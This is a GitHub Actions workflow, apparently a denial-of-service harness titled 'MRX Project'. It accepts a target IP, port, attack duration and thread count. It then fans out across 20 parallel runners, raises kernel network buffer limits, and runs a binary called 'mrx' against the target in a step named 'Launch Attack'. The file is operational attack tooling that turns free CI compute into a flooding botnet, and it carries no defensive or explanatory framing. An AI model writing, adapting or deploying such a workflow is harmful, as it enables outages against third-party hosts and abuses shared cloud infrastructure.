name: "MRX Project"
on:
  workflow_dispatch:
    inputs:
      ip:
        description: "Target IP"
        required: true
        type: string
      port:
        description: "Target Port"
        required: true
        type: string
      duration:
        description: "Attack Duration"
        required: true
        type: string
      threads:
        description: "Connection Threads"
        required: true
        type: string

jobs:
  network-test:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        worker: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
    steps:
    - name: Checkout code
      uses: actions/checkout@v3
    - name: Apply Kernel Tuning
      run: |
        sudo sysctl -w net.core.wmem_max=268435456 2>/dev/null || true
        sudo sysctl -w net.core.rmem_max=268435456 2>/dev/null || true
        sudo sysctl -w net.core.netdev_max_backlog=300000 2>/dev/null || true
        sudo sysctl -w net.core.optmem_max=16777216 2>/dev/null || true
        sudo sysctl -w net.ipv4.udp_mem='8388608 16777216 33554432' 2>/dev/null || true
        sudo sysctl -w net.ipv4.ip_local_port_range='15000 60000' 2>/dev/null || true
        sudo sysctl -w net.ipv4.tcp_timestamps=0 2>/dev/null || true
        sudo sysctl -w net.ipv4.tcp_sack=0 2>/dev/null || true
    - name: Verify Binary
      run: |
        if [ ! -f "./mrx" ]; then
          exit 1
        fi
        chmod +x mrx
    - name: Launch Attack
      run: |
        TIMEOUT=$(( ${{ github.event.inputs.duration }} + 10 ))
        timeout ${TIMEOUT}s ./mrx \
          "${{ github.event.inputs.ip }}" \
          "${{ github.event.inputs.port }}" \
          "${{ github.event.inputs.duration }}" \
          "${{ github.event.inputs.threads }}" 2>&1 || true